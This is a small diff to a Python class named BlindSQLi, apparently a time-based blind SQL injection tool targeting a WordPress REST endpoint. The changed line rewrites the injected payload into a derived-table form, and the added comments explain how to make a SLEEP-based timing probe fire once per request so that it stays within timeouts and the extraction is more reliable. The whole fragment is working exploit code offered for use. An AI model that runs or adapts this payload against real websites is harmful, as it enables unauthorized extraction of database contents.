@@ -107,8 +107,10 @@ class BlindSQLi:
         return int(text)
 
     def _elapsed(self, sql: str) -> float:
+        # Sleep inside an uncorrelated derived table (evaluated once) so it fires a single time, not
+        # once per matched row -- a bare per-row SLEEP(n) multiplies by row count and can exceed the timeout.
         self.requests += 1
-        return self.client.inject(f"0) OR {sql}-- -").elapsed
+        return self.client.inject(f"0) AND (SELECT 1 FROM (SELECT {sql})x)-- -").elapsed
 
     def _true(self, condition: str) -> bool:
         # Read X-WP-Total, not the body: the item-route source sends no `page`, so get_items() can
